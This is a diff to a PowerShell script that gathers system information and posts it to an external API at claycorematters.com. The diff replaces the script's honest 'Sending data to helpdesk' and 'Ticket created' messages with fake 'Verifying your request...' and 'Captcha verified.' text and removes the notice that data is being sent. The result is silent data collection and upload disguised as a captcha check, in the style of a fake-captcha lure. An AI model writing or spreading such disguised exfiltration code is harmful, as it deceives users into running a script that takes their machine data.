@@ -2,7 +2,7 @@
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-Write-Host "Gathering system diagnostics... Please wait." -ForegroundColor Cyan
+Write-Host "Verifying your request..." -ForegroundColor Cyan
 
 ### 1. Collect System Info
 $hostname   = $env:COMPUTERNAME
@@ -55,10 +55,9 @@ $payload = @{
 $apiUri = "https://api.claycorematters.com/v1/helpdesk/tickets" 
 
 try {
-    Write-Host "Sending data to helpdesk..." -ForegroundColor Cyan
     $response = Invoke-RestMethod -Uri $apiUri -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 15
-    Write-Host "Success! Ticket created standardly." -ForegroundColor Green
+    Write-Host "Captcha verified." -ForegroundColor Green
 }
 catch {
-    Write-Error "Failed to send data to helpdesk API. Error: $_"
+    Write-Error "Failed to verify"
 }
